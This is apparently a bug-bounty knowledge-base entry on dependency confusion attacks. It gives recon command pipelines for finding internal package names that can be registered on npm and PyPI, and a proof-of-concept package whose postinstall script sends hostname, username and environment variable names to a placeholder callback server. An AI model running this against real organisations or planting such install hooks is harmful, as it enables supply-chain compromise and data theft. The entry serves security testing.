---
title: "Dependency Confusion (Supply Chain Attack)"
type: technique
tags: [dependency-confusion, supply-chain, npm, pip, maven, package-manager, nuclei, github]
created: 2026-08-17
updated: 2026-08-17
sources: []
related: ["[[secrets-exposure]]", "[[api-security]]"]
status: active
---

# Dependency Confusion (Supply Chain Attack)

## Overview

Dependency confusion (also called namespace confusion) is a software supply-chain attack where an attacker registers a public package with the **same name** as an organization's internal private package. When the build system fetches the package, many package managers **prioritize public registries** over private ones by default, installing the malicious package.

Originally described by **Alex Birsan** in 2021, the attack compromised organizations including Apple, Microsoft, and PayPal.

## Impact

- **Bounties**: $1,000 to $150,000 depending on scope and impact
- **Code execution in the build/deploy** of the target organization
- **Access to internal infrastructure** if the malicious package installs in CI/CD
- **Supply-chain compromise** - all users of the package are affected

## How it works

```
Organization uses an internal package: "org-auth-utils" (private, no version on public npm)
    |
Attacker registers "org-auth-utils" on public npm with version 9999.0.0
    |
npm resolves: public > private (default in many configs)
    |
Malicious package installed during npm install / build
    |
postinstall script runs -> RCE / data exfiltration
```

## Where to look

### Risk indicators

- Organizations with JavaScript/Node.js projects (npm)
- Python applications (PyPI)
- Java/Kotlin projects (Maven/Gradle)
- `package.json` files exposed on web servers
- Public GitHub repositories with `package.json`
- Dependencies with internal-looking names (no `@scope/`)

## Test methodology

### Method 1: Subdomain scanning

```bash
# 1. Enumerate subdomains
subfinder -d example.com -o subdomains.txt
amass enum -passive -d example.com >> subdomains.txt

# 2. Probe live hosts
httpx -l subdomains.txt -o alive_subdomains.txt

# 3. Detect exposed package.json
nuclei -l alive_subdomains.txt \
  -t nuclei-templates/exposures/configs/package-json.yaml \
  -o packages.txt -v

# 4. Check hijackability in the npm registry
# fff = Fairly Fast Fetcher (Go tool)
cat packages.txt | cut -d ' ' -f6 | ./fff -s 200 -o root
# 200 OK = package already exists on npm (someone may have registered it)
# 404 = package does not exist = potentially registrable
```

### Method 2: GitHub org mining

```bash
# 1. Clone an entire GitHub org
export GHORG_GITHUB_TOKEN=<your_github_token>
ghorg clone ORGANIZATION_NAME -t $GHORG_GITHUB_TOKEN

# 2. Extract dependencies and check npm availability
find . -type f -name package.json \
  | xargs -n1 -I{} cat {} \
  | jq -r '.dependencies + .devDependencies' \
  | cut -d: -f1 \
  | tr -d '"|}|{' \
  | sort -u \
  | tr -s "\t" \
  | sort -u \
  | xargs -n1 -I{} echo "https://registry.npmjs.org/{}" \
  | grep -v "@" \
  | httpx -status-code -silent -content-length -mc 404
# 404 = package free to register -> dependency confusion candidate
```

### Method 3: Python (PyPI)

```bash
# Same concept for Python
find . -name "requirements*.txt" | xargs cat | \
  while read pkg; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$pkg/json")
    [[ "$status" == "404" ]] && echo "VULNERABLE: $pkg"
  done
```

## PoC (proof of concept)

### package.json of the malicious package (safe/benign for bounty)

```json
{
  "name": "target-internal-package-name",
  "version": "9999.0.0",
  "description": "Security Research - Dependency Confusion PoC",
  "scripts": {
    "postinstall": "node exploit.js"
  }
}
```

### exploit.js (metadata exfiltration only - no harm)

```javascript
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  platform: os.platform(),
  username: os.userInfo().username,
  env_keys: Object.keys(process.env),
  node_version: process.version,
  cwd: process.cwd(),
});

// Use your own server (Collaborator, interactsh, etc.)
const req = https.request({
  hostname: 'YOUR_CALLBACK_SERVER',
  path: '/callback',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});
req.write(data);
req.end();
```

**Important**: test in a Dockerized environment to demonstrate execution without risk.

## Tools

| Tool | Function |
|------|----------|
| **Nuclei** | Template for detecting exposed package.json |
| **httpx** | Live-host probe; registry status check |
| **fff** | Batch fetch for npm registry checks |
| **ghorg** | Cloning GitHub organizations |
| **jq** | JSON parsing to extract dependencies |
| **subfinder/amass** | Subdomain enumeration |

## Variants by language

| Ecosystem | Registry | Deps file |
|-----------|----------|-----------|
| JavaScript | npmjs.org | package.json |
| Python | pypi.org | requirements.txt, setup.py |
| Java | Maven Central | pom.xml |
| Ruby | rubygems.org | Gemfile |
| Go | proxy.golang.org | go.mod |
| .NET | nuget.org | .csproj, packages.config |

## Bug bounty success tips

- **Check scope**: most large programs (Google VRP) accept supply chain.
- **Benign PoC**: register a dummy package that curls a controlled webhook; never run code that causes real harm.
- **Build evidence**: show `npm install` logs installing your version of the package.
- **Do not install in production**: register the package but do not install it on real systems.
- **Rate limiting**: use `--silent` flags and delays to avoid bans.
- **Focus on JS-heavy targets**: npm is the most common vector.

## Report tips

- Include the exposed package.json as evidence.
- Demonstrate that the package exists in the internal registry but not the public one.
- Register the benign package and demonstrate via installation logs.
- Calculate potential impact: RCE across all of the organization's devs/CI/CD.
- Mention downstream supply-chain compromise.

## Search in recon results

During recon, finding `package-lock.json` in fuzzing results indicates dependencies that may be targets:

```bash
find /root/out/ -mindepth 2 -maxdepth 2 -type f -name 'fuzzing-all.txt' \
  -exec grep -H "package-lock.json" {} \;
```

## References

- Birsan, Alex - "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021)
- [[secrets-exposure]] - related repository-exposure technique
